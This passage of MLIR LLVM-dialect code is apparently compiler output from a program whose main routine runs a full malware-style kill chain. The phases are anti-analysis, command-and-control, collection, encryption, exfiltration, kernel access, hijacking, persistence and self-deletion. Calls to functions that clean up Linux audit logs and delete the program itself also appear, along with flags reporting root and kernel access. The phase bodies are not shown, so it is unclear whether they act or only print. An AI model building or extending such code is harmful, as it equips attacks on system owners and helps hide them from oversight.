    %34 = llvm.call @jocky_linux_cleanup_audit() : () -> i32
    llvm.store %34, %18 {alignment = 4 : i64} : i32, !llvm.ptr
    %35 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
    llvm.call @println(%35) : (!llvm.ptr) -> ()
    llvm.return %12 : i1
  }
  llvm.func @phase_delete() -> i1 {
    %0 = llvm.mlir.addressof @".str.65" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.66" : !llvm.ptr
    %3 = llvm.mlir.constant(true) : i1
    %4 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    llvm.call @println(%4) : (!llvm.ptr) -> ()
    llvm.call @jocky_self_delete() : () -> ()
    %5 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<19 x i8>
    llvm.call @println(%5) : (!llvm.ptr) -> ()
    llvm.return %3 : i1
  }
  llvm.func @main() -> i32 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.7" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.67" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.68" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.69" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.70" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.71" : !llvm.ptr
    %8 = llvm.mlir.constant(true) : i1
    %9 = llvm.mlir.addressof @".str.72" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.73" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.16" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.74" : !llvm.ptr
    %13 = llvm.mlir.addressof @kernel_access : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.75" : !llvm.ptr
    %15 = llvm.mlir.addressof @root_achieved : !llvm.ptr
    %16 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %17 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%17) : (!llvm.ptr) -> ()
    %18 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<187 x i8>
    llvm.call @println(%18) : (!llvm.ptr) -> ()
    %19 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<67 x i8>
    llvm.call @println(%19) : (!llvm.ptr) -> ()
    %20 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<187 x i8>
    llvm.call @println(%20) : (!llvm.ptr) -> ()
    %21 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%21) : (!llvm.ptr) -> ()
    %22 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %23 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<22 x i8>
    %24 = llvm.call @jocky_str_concat(%22, %23) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%24) : (!llvm.ptr) -> ()
    %25 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%25) : (!llvm.ptr) -> ()
    %26 = llvm.call @phase_anti_analysis() : () -> i1
    %27 = llvm.xor %26, %8 : i1
    llvm.cond_br %27, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    llvm.return %0 : i32
  ^bb2:  // pred: ^bb0
    %28 = llvm.call @phase_c2() : () -> i1
    llvm.store %28, %16 {alignment = 1 : i64} : i1, !llvm.ptr
    %29 = llvm.call @phase_model() : () -> i1
    llvm.store %29, %16 {alignment = 1 : i64} : i1, !llvm.ptr
    %30 = llvm.call @phase_collect() : () -> i1
    llvm.store %30, %16 {alignment = 1 : i64} : i1, !llvm.ptr
    %31 = llvm.call @phase_encrypt() : () -> i1
    llvm.store %31, %16 {alignment = 1 : i64} : i1, !llvm.ptr
    %32 = llvm.call @phase_exfil() : () -> i1
    llvm.store %32, %16 {alignment = 1 : i64} : i1, !llvm.ptr
    %33 = llvm.call @phase_kernel() : () -> i1
    llvm.store %33, %16 {alignment = 1 : i64} : i1, !llvm.ptr
    %34 = llvm.call @phase_hijack() : () -> i1
    llvm.store %34, %16 {alignment = 1 : i64} : i1, !llvm.ptr
    %35 = llvm.call @phase_modules() : () -> i1
    llvm.store %35, %16 {alignment = 1 : i64} : i1, !llvm.ptr
    %36 = llvm.call @phase_persist() : () -> i1
    llvm.store %36, %16 {alignment = 1 : i64} : i1, !llvm.ptr
    %37 = llvm.call @phase_delete() : () -> i1
    llvm.store %37, %16 {alignment = 1 : i64} : i1, !llvm.ptr
    %38 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%38) : (!llvm.ptr) -> ()
    %39 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<23 x i8>
    llvm.call @println(%39) : (!llvm.ptr) -> ()
    %40 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<23 x i8>
    %41 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %42 = llvm.call @strlen(%41) : (!llvm.ptr) -> i64
    %43 = llvm.call @string(%42) : (i64) -> !llvm.ptr
    %44 = llvm.call @jocky_str_concat(%40, %43) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %45 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %46 = llvm.call @jocky_str_concat(%44, %45) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%46) : (!llvm.ptr) -> ()
    %47 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<20 x i8>
    %48 = llvm.load %13 {alignment = 1 : i64} : !llvm.ptr -> i1
    %49 = llvm.zext %48 : i1 to i64
    %50 = llvm.call @string(%49) : (i64) -> !llvm.ptr
    %51 = llvm.call @jocky_str_concat(%47, %50) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%51) : (!llvm.ptr) -> ()
    %52 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<20 x i8>
    %53 = llvm.load %15 {alignment = 1 : i64} : !llvm.ptr -> i1
    %54 = llvm.zext %53 : i1 to i64
    %55 = llvm.call @string(%54) : (i64) -> !llvm.ptr
    %56 = llvm.call @jocky_str_concat(%52, %55) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%56) : (!llvm.ptr) -> ()
    llvm.return %2 : i32
  }
}
